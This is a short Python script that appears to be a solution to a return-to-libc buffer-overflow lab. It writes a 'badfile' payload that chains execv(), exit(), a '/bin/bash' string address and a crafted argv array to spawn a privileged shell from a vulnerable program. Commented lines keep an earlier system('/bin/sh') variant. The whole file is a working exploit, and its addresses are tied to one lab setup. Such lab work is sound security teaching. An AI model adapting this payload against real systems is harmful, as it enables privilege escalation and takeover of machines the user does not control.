#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

#X = 24+12
#sh_addr = 0xffffd3e9       # The address of "/bin/sh"
#content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

#Y = 24+4  
#system_addr = 0xf7e0a360  # The address of system()
#content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Y = 24+4
execv_addr = 0xf7e91410       #The address of execv()
content[Y:Y+4] = (execv_addr).to_bytes(4, byteorder='little')

Z = 24+8
exit_addr = 0xf7dfcec0     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

ARG1 = 24+12               #The address of the first argument to execv
bash_addr = 0xffffde3a     #The address of "/bin/bash"
content[ARG1:ARG1+4] = (bash_addr).to_bytes(4, byteorder='little')

ARG2 = 24+16               #The address of the second argument to execv
ARGV_OFFSET = 100          #The positoin of argv in the buffer (it will be used through offset from main's input addr)
input_addr = 0xffffcd60     #Main's input addr
argv_addr = input_addr + ARGV_OFFSET #The address of the values for argv in the input read from the file badfile. This is the same as the content of badfile
content[ARG2:ARG2+4] = (argv_addr).to_bytes(4, byteorder='little')

#The values of argv in main's input
content[ARGV_OFFSET:ARGV_OFFSET+4] = (bash_addr).to_bytes(4, byteorder='little')

p_addr = 0xffffd443
content[ARGV_OFFSET+4:ARGV_OFFSET+8] = (p_addr).to_bytes(4, byteorder='little')

zero_val = 0x00000000 #The value zero for argv[2], this is null it is an address too
content[ARGV_OFFSET+8:ARGV_OFFSET+12] = (zero_val).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
